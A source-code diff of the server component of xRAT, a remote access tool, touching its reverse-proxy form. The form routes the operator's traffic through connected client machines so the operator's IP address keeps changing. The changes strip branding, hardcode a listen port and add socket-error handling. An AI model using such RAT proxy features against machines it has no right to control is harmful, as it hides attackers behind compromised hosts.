@@ -1,5 +1,7 @@
 ﻿using System;
+using System.Net.Sockets;
 using System.Windows.Forms;
+using xServer.Core.Data;
 using xServer.Core.ReverseProxy;
 using xServer.Core.Helper;
 using xServer.Core.Networking;
@@ -30,7 +32,7 @@ namespace xServer.Forms
         {
             if (_clients.Length > 1)
             {
-                this.Text = "xRAT 2.0 - Reverse Proxy [Load-Balancer is active]";
+                this.Text = "Reverse Proxy [Load-Balancer is active]";
                 lblLoadBalance.Text = "The Load Balancer is active, " + _clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";
             }
             else if (_clients.Length == 1)
@@ -47,7 +49,7 @@ namespace xServer.Forms
                 SocksServer = new ReverseProxyServer();
                 SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                 SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
-                SocksServer.StartServer(_clients, "0.0.0.0", (int)nudServerPort.Value);
+                SocksServer.StartServer(_clients, "0.0.0.0", 4782);
                 btnStart.Enabled = false;
                 btnStop.Enabled = true;
 
@@ -56,12 +58,27 @@ namespace xServer.Forms
                 _refreshTimer.Interval = 100;
                 _refreshTimer.Start();
             }
+            catch (SocketException ex)
+            {
+                if (ex.ErrorCode == 10048)
+                {
+                    MessageBox.Show("The port is already in use.", "Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+                else
+                {
+                    MessageBox.Show(
+                        string.Format(
+                            "An unexpected socket error occurred: {0}\n\nError Code: {1}\n\nPlease report this as fast as possible here:\n{2}/issues",
+                            ex.Message, ex.ErrorCode, Settings.RepositoryURL), "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+                btnStop_Click(sender, null);
+            }
             catch (Exception ex)
             {
                 MessageBox.Show(
                     string.Format(
-                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
-                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\n{1}/issues",
+                        ex.Message, Settings.RepositoryURL), "Unexpected Listen Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 btnStop_Click(sender, null);
             }
         }
